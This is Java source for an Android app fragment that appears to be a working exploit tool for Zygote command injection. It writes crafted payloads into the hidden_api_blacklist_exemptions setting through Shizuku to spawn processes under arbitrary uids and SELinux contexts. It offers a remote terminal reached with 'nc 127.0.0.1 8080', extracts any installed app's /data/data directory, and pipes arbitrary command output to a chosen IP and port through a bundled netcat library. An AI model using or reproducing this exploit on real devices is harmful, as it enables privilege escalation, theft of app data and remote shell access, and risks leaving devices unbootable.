package com.wqry085.deployesystem;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog;
import androidx.preference.MultiSelectListPreference;
import androidx.preference.Preference;
import androidx.preference.PreferenceCategory;
import androidx.preference.PreferenceFragmentCompat;
import androidx.preference.EditTextPreference;
import androidx.preference.PreferenceManager;
import androidx.preference.PreferenceScreen;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.snackbar.Snackbar;
import com.google.android.material.textfield.TextInputLayout;
import com.wqry085.deployesystem.hellodream;
import com.wqry085.deployesystem.payloadtext;
import com.wqry085.deployesystem.sockey.ZygoteControlClient;
import com.wqry085.deployesystem.sockey.ZygoteControlListener;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import rikka.shizuku.Shizuku;
/*
   MIUI与澎湃套壳对adb进行了限制
   无权修改系统设置和模拟点击剥夺了Shell的WRITE_SECURE_SETTINGS权限
   这是致命的没有WRITE_SECURE_SETTINGS权限Shell无法修改hidden_api_blacklist_exemptions导致注入无法发生
   请进入设置在开发者选项中打开USB安全设置来恢复Shell权利
   同类型设备如OPPO请禁止权限监控
*/
public class ZygoteFragment extends PreferenceFragmentCompat 
    implements Preference.OnPreferenceChangeListener,
               Preference.OnPreferenceClickListener {
private ExecutorService executor;
    // Preference Keys
    private String hello_dream="hello dream";
    private String hello_dream_a="HELLO DREAM";
    private static final String KEY_STATUS = "runtime_status";
    private static final String KEY_LOGS = "log_output";
    private static final String KEY_command_input = "command_input";
    private static final String KEY_IP = "ip_address";
    private static final String KEY_ADVANCED_CATEGORY = "advanced_category";
    private static final String top_data = "top_data";
    private static final String KEY_ADVANCED_TRIGGER = "advanced_trigger";
    private static final String KEY_EXEC = "execute_btn";
    private static final String KEY_PORT = "server_port";
    private static final String KEY_terminal = "terminal";
    private static final String KEY_START = "start_server";
    private static final String KEY_STOP = "stop_server";
EditTextPreference editTextPreference;
    EditTextPreference editTextPreferencee;
    EditTextPreference setuid_input;
    EditTextPreference setgroup_input;
    EditTextPreference setgid_input;
    EditTextPreference editTextPreferenceee;
    EditTextPreference editTextPreferenceeee;
    
    EditTextPreference editTextPreferenceeeee;
    EditTextPreference editTextPreferenceeeeee;
    EditTextPreference editTextPreferenceeeeeee;
    SharedPreferences sharedPreferences;
    // Default Values
    private static final String DEFAULT_IP = "0.0.0.0";
    private static final int DEFAULT_PORT = 9981;
  String message;
    private static final String INITIAL_LOG_TEXT = "No logs";
private PreferenceCategory advancedCategory;
    private Preference advancedTrigger;
    private boolean isAdvancedExpanded = false;
    // Server
    private ServerThread serverThread;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isFirstLog = true;
    @Override
    public void onCreatePreferences(Bundle savedInstanceState, String rootKey) {
        setPreferencesFromResource(R.xml.root_preference, rootKey);
        initPreferences();
    }
    private void initPreferences() {
        dis_miui_optimization();
        executor = Executors.newSingleThreadExecutor();
         sharedPreferences = getPreferenceManager().getSharedPreferences();
      //  MaterialDialogHelper.showSimpleDialog(getActivity(), "警告", "这是一个非公测版本很多功能都没实现请你做好出现zygote乱序甚至zygote损怀和双清的风险 如了解请继续");
        // Initialize log display
        findPreference(KEY_LOGS).setSummary(INITIAL_LOG_TEXT);

        // Set default values
        SharedPreferences prefs = getPreferenceManager().getSharedPreferences();
        if (!prefs.contains(KEY_IP)) {
            prefs.edit().putString(KEY_IP, DEFAULT_IP).apply();
        }
        if (!prefs.contains(KEY_PORT)) {
            prefs.edit().putString(KEY_PORT, String.valueOf(DEFAULT_PORT)).apply();
        }

        // Setup listeners
        findPreference(KEY_IP).setOnPreferenceChangeListener(this);
        findPreference(KEY_PORT).setOnPreferenceChangeListener(this);
        findPreference(KEY_START).setOnPreferenceClickListener(this);
        findPreference(KEY_EXEC).setOnPreferenceClickListener(this);
        findPreference(KEY_STOP).setOnPreferenceClickListener(this);
findPreference(KEY_terminal).setOnPreferenceClickListener(this);
        // Initial state
        findPreference(top_data).setOnPreferenceClickListener(this);
        findPreference(KEY_STOP).setEnabled(false);
         editTextPreference = findPreference(KEY_command_input);
        editTextPreferencee = findPreference(KEY_IP);
        setuid_input = findPreference("setuid_input");
        setgid_input = findPreference("setgid_input");
        setgroup_input = findPreference("setgroup_input");
        editTextPreferenceeee = findPreference("setselinux_input");
        editTextPreferenceee = findPreference(KEY_PORT);
        editTextPreferenceeeee = findPreference("zyg1");
        editTextPreferenceeeeee = findPreference("zyg2");
        editTextPreferenceeeeeee = findPreference("zyg3");
        advancedCategory = findPreference(KEY_ADVANCED_CATEGORY);
        advancedTrigger = findPreference(KEY_ADVANCED_TRIGGER);
       Preference shell = findPreference("shell_terminal");
        Preference skkk = findPreference("1312");
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R){
            skkk.setVisible(true);
            editTextPreferenceeeee.setVisible(true);
            editTextPreferenceeeeee.setVisible(true);
            editTextPreferenceeeeeee.setVisible(true);
            }else{
                skkk.setVisible(false);
            editTextPreferenceeeee.setVisible(false);
            editTextPreferenceeeeee.setVisible(false);
            editTextPreferenceeeeeee.setVisible(false);
            }
                    advancedCategory.setVisible(false);
        // 设置点击监听器
        advancedTrigger.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() {
            @Override
            public boolean onPreferenceClick(Preference preference) {
                toggleAdvancedSettings();
                return true;
            }
        });
        shell.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() {
            @Override
            public boolean onPreferenceClick(Preference preference) {
                    MaterialDialogHelper.showConfirmDialog(getActivity(), "创建远程终端", "确定吗应用会尝试使用uid("+setuid_input.getText().toString()+")创建远程终端 创建前请确保之前的远程终端已结束", 
        (dialog, which) -> {
           int currentVersion = android.os.Build.VERSION.SDK_INT;
        
        // 根据Android版本选择不同的资源
        if (currentVersion >= android.os.Build.VERSION_CODES.S && 
            currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
            //安卓11以上的实现
            String android1213=replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $(/system/bin/setsid "+getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+setuid_input.getText().toString()+")"+payload_buffer();
                                
              runpayload(android1213);
                                
                        } else {
            runpayload(replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"echo $(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+setuid_input.getText().toString()+");"+payload_buffer());
        }
                            MaterialDialogHelper.showSimpleDialog(getActivity(), "创建结束", "如成功请在任意终端模拟器执行nc 127.0.0.1 8080");
        });
                return false;
            }
        });
        skkk.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() {
            @Override
            public boolean onPreferenceClick(Preference preference) {
                    
                            MaterialDialogHelper.showSimpleDialog(getActivity(), "警告", "在Android12及以上，情况变得非常复杂，命令解析现在由NativeCommandBuffer完成，即该解析器在解析一次内容之后，对于未识别的trailing内容，它将丢弃缓冲区中的所有内容并退出，而不是留作下一次解析。这意味着命令注入的内容会被直接丢弃！各个设备厂商可能都不一致请调整配置poc默认的配置并不一定可靠请做好设备不开机的准备");
                return false;
            }
        });
        MultiSelectListPreference multiSelectPreference = findPreference("multi_select_preference");
        if (multiSelectPreference != null) {
            multiSelectPreference.setOnPreferenceChangeListener((preference, newValue) -> {
                Set<String> selectedValues = (Set<String>) newValue;
                return true;
            });
        }
        
    }
private void toggleAdvancedSettings() {
        isAdvancedExpanded = !isAdvancedExpanded;
        
        if (advancedCategory != null) {
            advancedCategory.setVisible(isAdvancedExpanded);
        }
    }
    // ==================== Socket Server Core ====================
    private class ServerThread extends Thread {
        private ServerSocket serverSocket;
        private volatile boolean isRunning = true;

        @Override
        public void run() {
            try {
                int port = getPortFromPreferences();
                serverSocket = new ServerSocket(port);

                handler.post(() -> {
                    appendLog("服务器已启动，端口: " + port);
                    updateStatus("运行中");
                    findPreference(KEY_START).setEnabled(false);
                    findPreference(KEY_STOP).setEnabled(true);
                });

                while (isRunning) {
                    Socket clientSocket = serverSocket.accept();
                    new ClientHandler(clientSocket).start();
                }
            } catch (IOException e) {
                if (!isRunning) return; // Normal shutdown
                handler.post(() -> appendLog("服务器错误: " + e.getMessage()));
            }
        }

        void shutdown() {
            isRunning = false;
            try {
                if (serverSocket != null) {
                    serverSocket.close();
                }
                handler.post(() -> appendLog("服务器已停止"));
            } catch (IOException e) {
                handler.post(() -> appendLog("停止错误: " + e.getMessage()));
            }
        }

        private int getPortFromPreferences() {
            try {
                String portStr = getPreferenceManager()
                    .getSharedPreferences()
                    .getString(KEY_PORT, String.valueOf(DEFAULT_PORT));
                return Integer.parseInt(portStr);
            } catch (NumberFormatException e) {
                return DEFAULT_PORT;
            }
        }
    }

    private class ClientHandler extends Thread {
        private final Socket clientSocket;
        private final String clientIp;

        ClientHandler(Socket socket) {
            this.clientSocket = socket;
            this.clientIp = socket.getInetAddress().getHostAddress();
            handler.post(() -> appendLog("客户端连接: " + clientIp));
        }

        @Override
        public void run() {
            try (BufferedReader in = new BufferedReader(
                 new InputStreamReader(clientSocket.getInputStream()))) {
                
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                     message = inputLine;
                }
                 final String end =message;
                handler.post(() -> appendLog(clientIp + " 说: " + end));
            } catch (IOException e) {
                handler.post(() -> appendLog(clientIp + " 断开连接"));
            } finally {
                try {
                    clientSocket.close();
                } catch (IOException e) {
                    Log.e("ClientHandler", "关闭错误: ", e);
                }
            }
        }
    }

    // ==================== UI Controls ====================
    private void startServer() {
        if (serverThread == null) {
            serverThread = new ServerThread();
            serverThread.start();
        }
    }

    private void stopServer() {
        if (serverThread != null) {
            serverThread.shutdown();
            serverThread = null;
            updateStatus("已停止");
            findPreference(KEY_START).setEnabled(true);
            findPreference(KEY_STOP).setEnabled(false);
        }
    }

    // ==================== Preference Callbacks ====================
    @Override
    public boolean onPreferenceChange(Preference preference, Object newValue) {
        String key = preference.getKey();
        
        if (KEY_IP.equals(key)) {
            String ip = (String) newValue;
            if (!isValidIp(ip)) {
                showToast("无效IP地址");
                return false;
            }
            appendLog("IP更新为: " + ip);
            return true;
        }
        else if (KEY_PORT.equals(key)) {
            try {
                int port = Integer.parseInt((String) newValue);
                if (port < 1024 || port > 65535) {
                    showToast("端口必须为1024-65535");
                    return false;
                }
                appendLog("端口更新为: " + port);
                return true;
            } catch (NumberFormatException e) {
                showToast("无效端口号");
                return false;
            }
        }
        return false;
    }

    @Override
    public boolean onPreferenceClick(Preference preference) {
        String key = preference.getKey();
        
        if (KEY_START.equals(key)) {
            startServer();
            return true;
        }else if(top_data.equals(key)){
            MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(getActivity());
        builder.setTitle("提取应用数据");
        LayoutInflater inflater = LayoutInflater.from(getActivity());
        View dialogView = inflater.inflate(R.layout.appdir, null);
        builder.setView(dialogView);
        final TextInputLayout textInputLayout = dialogView.findViewById(R.id.text_input_layout);
        final EditText editText = textInputLayout.getEditText(); // 正确获取EditText的方式
        builder.setPositiveButton("运行", (dialog, which) -> {
                    
            if (editText != null) {
                String inputText = editText.getText().toString().trim();
                if (inputText.isEmpty()) {
                    textInputLayout.setError("输入内容不能为空");
                } else {
                            if(!isAppInstalled(getActivity(),editText.getText().toString())){
                                Snackbar snackbar = Snackbar.make(getView(), "应用不存在", Snackbar.LENGTH_SHORT);
        snackbar.setAction("ok", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                        
            }
        });
        
        snackbar.show();
                                return;
                            }
                    int uid =getUidByPackageName(getActivity(),editText.getText().toString());
                   int currentVersion = android.os.Build.VERSION.SDK_INT;
        if (currentVersion >= android.os.Build.VERSION_CODES.S && 
            currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
            String android1213=replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $(/system/bin/setsid "+getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423"+")"+payload_buffer();
                                
              runpayload(android1213);
                                
                        } else {
            runpayload(replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"echo \"$(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423);"+payload_buffer());
        }
                            Snackbar snackbar = Snackbar.make(getView(), "payload已注入", Snackbar.LENGTH_SHORT);
        snackbar.setAction("ok", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                        
            }
        });
        
        snackbar.show();
                            }         
                        
            }
        });

        builder.setNegativeButton("取消", (dialog, which) -> {
            dialog.cancel();
        });
        AlertDialog dialog = builder.create();
        dialog.show();
        }else if (KEY_STOP.equals(key)) {
            stopServer();
            return true;
        }else if(KEY_EXEC.equals(key)){
            
            if(editTextPreference.getText().toString().equals(hello_dream)){
                Intent  xh=new Intent( );
							xh.setClass(getActivity(),hellodream.class);
							getActivity().startActivity(xh);
                getActivity().finish();
            }else{
            int currentVersion = android.os.Build.VERSION.SDK_INT;
        
        // 根据Android版本选择不同的资源
        if (currentVersion >= android.os.Build.VERSION_CODES.S && 
            currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
            //安卓11以上的实现
            String android1213=replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"/system/bin/logwrapper echo zYg0te $("+editTextPreference.getText().toString()+" | "+ getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_nc.so "+editTextPreferencee.getText().toString()+" "+editTextPreferenceee.getText().toString()+")"+payload_buffer();
                runpayload(android1213);
                        } else {
            runpayload(replaceSetIds(Get_Payload(),setuid_input.getText().toString(),setgid_input.getText().toString(),editTextPreferenceeee.getText().toString())+"echo \"$(" + editTextPreference.getText().toString()+")\" | "+ getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_nc.so " + editTextPreferencee.getText().toString() + " "+editTextPreferenceee.getText().toString()+";"+payload_buffer());
        }
            Snackbar snackbar = Snackbar.make(getView(), ">>>>>>>> payload", Snackbar.LENGTH_SHORT);
        snackbar.setAction("ok", new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                        
            }
        });
        
        snackbar.show();
              
                }
            
        }else if(KEY_terminal.equals(key)){
            Intent  xh=new Intent( );
							xh.setClass(getActivity(),TerminalActivity.class);
							getActivity().startActivity(xh);//直接粘贴到JAVA里 xh是跳转后布局的JAVA名 可以改
        }
          
        return false;
    }

    // ==================== Helper Methods ====================
    private void appendLog(String message) {
        Preference logPref = findPreference(KEY_LOGS);
        String current = logPref.getSummary().toString();
        
        // 清除初始提示
        if (isFirstLog || current.equals(INITIAL_LOG_TEXT)) {
            current = "";
            isFirstLog = false;
        }
        
        logPref.setSummary(message);
    }

    private void updateStatus(String status) {
        findPreference(KEY_STATUS).setSummary(status);
    }

    private boolean isValidIp(String ip) {
        return ip != null && 
               (ip.matches("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$") ||
                "0.0.0.0".equals(ip));
    }

    private void showToast(String message) {
        Toast.makeText(requireContext(), message, Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDestroy() {
        stopServer();
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
    public  void runpayload(String payload){
        ShizukuExec("pm grant com.wqry085.deployesystem android.permission.WRITE_SECURE_SETTINGS");
        ShizukuExec("am force-stop com.android.settings");
        ShizukuExec("echo '"+payload+"' > /data/local/tmp/只读配置.txt");
        ContentValues values = new ContentValues();
                values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                values.put(Settings.Global.VALUE, payload);
                try {
                    getActivity().getContentResolver().insert(Uri.parse("content://settings/global"), values);
                } catch (Exception e) {
                   MaterialDialogHelper.showSimpleDialog(getActivity(), "加载payload失败", e.toString());
                }
        ShizukuExec("am start -n com.android.settings/.Settings");
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
    @Override
    public void run() {
       ContentValues values2 = new ContentValues();
                values2.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                values2.put(Settings.Global.VALUE, "null"); // 严重警告如果不执行此操作理论上你的配置可以持久化但导致的可能更多是不开机
                try {
                    getActivity().getContentResolver().insert(Uri.parse("content://settings/global"), values2);
                } catch (Exception e) {
                    e.printStackTrace();
                   //MaterialDialogHelper.showSimpleDialog(getActivity(), "无法恢复配置", e.toString());
                }
    }
}, 200);
    }
    public static String ShizukuExec(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p = Shizuku.newProcess(new String[]{"sh"}, null, null);
            OutputStream out = p.getOutputStream();
            out.write((cmd + "\nexit\n").getBytes());
            out.flush();
            out.close();
            BufferedReader mReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String inline;
            while ((inline = mReader.readLine())!= null) {
                output.append(inline).append("\n");
            }
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((inline = errorReader.readLine())!= null) {
                output.append(inline).append("\n");
            }

            int exitCode = p.waitFor();
            if (exitCode!= 0) {
                output.append("漏洞部署结束: ").append(exitCode);
            }
            return output.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return e.toString();
        }
    }
 /*   public String getPayload() {
    InputStream inputStream = null;
    try {
        int currentVersion = android.os.Build.VERSION.SDK_INT;
        
        // 根据Android版本选择不同的资源
        if (currentVersion >= android.os.Build.VERSION_CODES.S && 
            currentVersion <= android.os.Build.VERSION_CODES.TIRAMISU) {
            inputStream = getResources().openRawResource(R.raw.payload1213);
        } else {
            inputStream = getResources().openRawResource(R.raw.payload);
        }
            
        // 在第3行后插入新参数（实际是第4行，因为计数行是第0行）
        String modifiedConfig = insertParamsAfter(convertStreamToString(inputStream), "--runtime-args", getMultiSelectedTexts(getActivity(),"multi_select_preference"));
       if (setgroup_input.getText() != null && !setgroup_input.getText().toString().isEmpty()) {
    String[] group = {"--setgroups=" + setgroup_input.getText().toString()};
    return insertParamsAfter(modifiedConfig, "--setgid=", group);
}
        return modifiedConfig;
        
    } catch (Exception e) {
        e.printStackTrace();
        return ""; // 或者返回默认值/抛出异常
    } finally {
        // 确保流被关闭
        if (inputStream != null) {
            try {
                inputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
*/
// 辅助方法：将InputStream转换为String
private String convertStreamToString(InputStream is) throws IOException {
    BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
    StringBuilder stringBuilder = new StringBuilder();
    String line;
    
    while ((line = reader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    
    reader.close();
    return stringBuilder.toString();
}
    public static String replaceSetIds(String originalText, String newUid, String newGid, String newSelinux) {
    if (originalText == null) {
        return null;
    }
    
    String result = originalText;
    
    // 分别处理每个参数，避免冲突
    if (newUid != null) {
        result = replaceExactParameter(result, "--setuid=", newUid);
    }
    
    if (newGid != null) {
        result = replaceExactParameter(result, "--setgid=", newGid);
    }
        
    if (newSelinux != null) {
        result = replaceExactParameter(result, "--seinfo=", newSelinux);
    }
        
    return result;
}

private static String replaceExactParameter(String text, String exactParam, String newValue) {
    StringBuilder result = new StringBuilder();
    int lastIndex = 0;
    int paramLen = exactParam.length();
    
    while (true) {
        // 查找完整的参数（包括边界检查）
        int paramIndex = findExactParameter(text, exactParam, lastIndex);
        if (paramIndex == -1) {
            result.append(text, lastIndex, text.length());
            break;
        }
        
        // 添加参数之前的内容
        result.append(text, lastIndex, paramIndex + paramLen);
        
        int valueStart = paramIndex + paramLen;
        int valueEnd = valueStart;
        
        // 提取数字值
        while (valueEnd < text.length() && Character.isDigit(text.charAt(valueEnd))) {
            valueEnd++;
        }
        
        // 替换值
        result.append(newValue);
        lastIndex = valueEnd;
    }
    
    return result.toString();
}

// 精确查找参数（避免部分匹配）
private static int findExactParameter(String text, String param, int fromIndex) {
    int index = fromIndex;
    while (index < text.length()) {
        int found = text.indexOf(param, index);
        if (found == -1) return -1;
        
        // 检查是否是完整的参数
        if (isExactParameter(text, found, param)) {
            return found;
        }
        
        index = found + 1; // 继续查找
    }
    
    return -1;
}

// 检查是否是精确的参数匹配
private static boolean isExactParameter(String text, int index, String param) {
    // 检查前面：应该是行首、空格或其他参数分隔符
    if (index > 0) {
        char prev = text.charAt(index - 1);
        if (!Character.isWhitespace(prev) && prev != '\n' && prev != '\r') {
            return false;
        }
    }
    
    // 检查后面：确保是完整的参数名
    if (index + param.length() > text.length()) {
        return false;
    }
    
    String actual = text.substring(index, index + param.length());
    return actual.equals(param);
}
public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
    SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
    Set<String> selectedValues = sharedPreferences.getStringSet(preferenceKey, new HashSet<String>());
    if (selectedValues.isEmpty()) {
        return new String[0];
    }
    String[] entryTexts = context.getResources().getStringArray(R.array.multi_select_options);
    String[] entryValues = context.getResources().getStringArray(R.array.multi_select_values);
    List<String> selectedTexts = new ArrayList<>();
    
    for (String selectedValue : selectedValues) {
        for (int i = 0; i < entryValues.length; i++) {
            if (entryValues[i].equals(selectedValue)) {
                selectedTexts.add(entryTexts[i]);
                break;
            }
        }
    }
    
    return selectedTexts.toArray(new String[0]);
}
     
     
    
    public static String insertParamsAfter(String originalText, String anchorParam, String[] newParams) {
        if (originalText == null || originalText.isEmpty()) {
            return originalText;
        }
        Pattern p = Pattern.compile("\\d+");
        Matcher m = p.matcher(originalText);

        int paramCount = -1;
        if (m.find()) {
            paramCount = Integer.parseInt(m.group());
            originalText = new StringBuilder(originalText)
                    .replace(m.start(), m.end(), String.valueOf(paramCount + newParams.length))
                    .toString();
        } else {
            throw new IllegalArgumentException("未找到参数总数数字！");
        }
        String[] lines = originalText.split("(?<=\n)", -1);

        StringBuilder result = new StringBuilder();
        boolean inserted = false;
        boolean reachedInvokeWith = false;

        for (String line : lines) {
            if (line.contains("--invoke-with")) {
                reachedInvokeWith = true;
            }
            if (!reachedInvokeWith) {
                result.append(line);
                if (!inserted && line.contains(anchorParam)) {
                    for (String param : newParams) {
                        result.append(param).append("\n");
                    }
                    inserted = true;
                }
            } else {
                result.append(line);
            }
        }

        if (!inserted) {
            throw new IllegalArgumentException("未找到锚点参数: " + anchorParam);
        }

        return result.toString();
    }
    public static int getUidByPackageName(Context context, String packageName) {
        if (packageName == null || packageName.isEmpty()) {
            return -1;
        }
        
        PackageManager packageManager = context.getPackageManager();
        
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            return applicationInfo.uid;
            
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return -1;
        }
    }
    public static boolean isAppInstalled(Context context, String packageName) {
        if (TextUtils.isEmpty(packageName)) {
            return false;
        }
        
        try {
            PackageManager packageManager = context.getPackageManager();
            packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
     String Get_Payload() {
           if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R){
            String Payload = "";
            int zyg1= Integer.parseInt(editTextPreferenceeeee.getText().toString());
            int zyg2= Integer.parseInt(editTextPreferenceeeeee.getText().toString());
            for (int i = 0; i != zyg1; ++i) {
                Payload += "\n";
            }
            for (int i = 0; i != zyg2; ++i) {
                Payload += "A";
            }
        Payload +=
        ZygoteArguments.CALCULATE +
        ZygoteArguments.SET_UID +
        ZygoteArguments.SET_GID +
        ZygoteArguments.ARGS +
        ZygoteArguments.SEINFN +
        ZygoteArguments.RUNTIME_FLAGS +
        ZygoteArguments.PROC_NAME +
        ZygoteArguments.EXEC_WITH;
            try {
        String modifiedConfig = insertParamsAfter(Payload, "--runtime-args", getMultiSelectedTexts(getActivity(),"multi_select_preference"));
       if (setgroup_input.getText() != null && !setgroup_input.getText().toString().isEmpty()) {
    String[] group = {"--setgroups=" + setgroup_input.getText().toString()};
    return insertParamsAfter(modifiedConfig, "--setgid=", group);
}
        return modifiedConfig;
        
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    } 
            }else{
        String Payload = "";
        for (int i = 0; i != 5; ++i) {
                Payload += "\n";
            }
            
        Payload +=
        ZygoteArguments.CALCULATE +
        ZygoteArguments.SET_UID +
        ZygoteArguments.SET_GID +
        ZygoteArguments.ARGS +
        ZygoteArguments.SEINFN +
        ZygoteArguments.RUNTIME_FLAGS +
        ZygoteArguments.PROC_NAME +
        ZygoteArguments.EXEC_WITH;
            try {
        String modifiedConfig = insertParamsAfter(Payload, "--runtime-args", getMultiSelectedTexts(getActivity(),"multi_select_preference"));
       if (setgroup_input.getText() != null && !setgroup_input.getText().toString().isEmpty()) {
    String[] group = {"--setgroups=" + setgroup_input.getText().toString()};
    return insertParamsAfter(modifiedConfig, "--setgid=", group);
}
        return modifiedConfig;
        
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    } 
    }
    }
    void dis_miui_optimization() {
    try {
        String currentValue = Settings.Secure.getString(getActivity().getContentResolver(), "miui_optimization");
        if (currentValue == null) {
            return;
        }
        int currentState = Settings.Secure.getInt(getActivity().getContentResolver(), "miui_optimization", -1);
        if (currentState == 1) {
            Toast.makeText(getActivity(),"请关闭MIUI优化！！！",Toast.LENGTH_SHORT).show();
            Settings.Secure.putInt(getActivity().getContentResolver(), "miui_optimization", 0);
        }
    } catch (SecurityException e) {
        Toast.makeText(getActivity(),"MIUI_OPT: "+e.toString(),Toast.LENGTH_SHORT).show();
    } catch (Exception e) {
        Toast.makeText(getActivity(),"MIUI_OPT: "+e.toString(),Toast.LENGTH_SHORT).show();
    }
}
    String payload_buffer(){
        String buffer=" ";
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R){
            int zyg3= Integer.parseInt(editTextPreferenceeeeeee.getText().toString());
            String sert = "";
            for (int i = 0; i != zyg3; ++i) {
            sert += ",";
            }
             buffer+=
            "#"+sert+"X";
            }else{
             buffer+=
            "#,,,,X";
            }
        return buffer;
    }
}